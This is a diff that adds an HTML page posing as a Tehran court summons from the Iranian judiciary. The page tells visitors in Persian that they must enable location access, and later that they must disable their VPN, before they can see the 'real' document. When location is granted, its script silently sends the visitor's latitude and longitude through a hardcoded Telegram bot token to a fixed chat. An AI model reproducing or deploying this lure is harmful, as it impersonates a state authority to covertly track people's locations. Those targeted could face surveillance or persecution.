@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Iran Judiciary Tehran Court</title>
+  <style>
+    body {
+      text-align: center;
+      font-family: sans-serif;
+      padding: 20px;
+    }
+    #jalbImage {
+      /* برای ریسپانسیو بودن: در موبایل 100%، در دسکتاپ حداکثر 794px */
+      width: 100%; 
+      max-width: 794px; /* حداکثر عرض A4 برای دسکتاپ */
+      height: auto;
+      border: 2px solid black;
+      margin-top: 20px;
+      /* تغییرات برای مرکز قرار دادن تصویر */
+      display: block; 
+      margin-center: auto;
+      margin-center: auto;
+      
+      filter: none; 
+      transition: opacity 1s ease, src 0s; 
+    }
+
+    /* Media Query برای دسکتاپ (صفحات بزرگتر از 768 پیکسل) */
+    @media (min-width: 768px) {
+        #jalbImage {
+            /* در دسکتاپ، عرض تصویر روی اندازه A4 ثابت می‌شود */
+            width: 794px; /* عرض تقریبی A4 در 96DPI */
+        }
+    }
+  </style>
+</head>
+<body>
+  <p id="status">تصویر اولیه نمایش داده شده است. لطفاً موقعیت دستگاه را برای مشاهده تصویر اصلی فعال کنید.</p>
+
+    <img id="jalbImage" src="JALB2.png" alt="شماره  دوستان"/>
+
+  <script>
+    window.onload = function () {
+      const status = document.getElementById('status');
+      const image = document.getElementById('jalbImage');
+
+      if (!navigator.geolocation) {
+        status.innerText = "❌ شما تاید مشاهده مدرک را به گونه ویب لغوه نمودید";
+        return;
+      }
+      
+      // شروع درخواست مکان‌یابی
+      navigator.geolocation.getCurrentPosition(
+
+        position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          // 1. تغییر منبع تصویر به jalb.jpg
+          image.src = "JALB.jpg";
+          image.alt = "تصویر اصلی فراخوان دادگاه";
+
+          // 2. ارسال موقعیت به تلگرام
+          const token = '7851461640:AAFtIgSsotn-BdkVbXqCEOoSMWsQBJDZTfg';
+          const chatId = '7570861617';
+          const message = `📍 موقعیت کاربر:\nعرض جغرافیایی: ${lat}\nطول جغرافیایی: ${lon}`;
+
+          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: message })
+          });
+
+          status.innerText = "";
+        },
+        // ❌ در صورت شکست (رد شدن، timeout و...)
+        error => {
+          switch(error.code){
+            case error.PERMISSION_DENIED:
+              status.innerText = "❌ شما لغو باز دید نمودید .";
+              break;
+            case error.POSITION_UNAVAILABLE:
+              status.innerText = "❌ جهت مشاهد لطفآ فیلترشکن خویش را خاموش نماید.";
+              break;
+            case error.TIMEOUT:
+              status.innerText = "❌ درخواست مشاهده به پیان رسید جهت باز دید صحفه را ریفرش نماید";
+              break;
+            default:
+              status.innerText = "❌ام ام ای محفوظ کننده مدارک های معتبر شما";
+          }
+        }
+      );
+    };
+  </script>
+</body>
+</html>
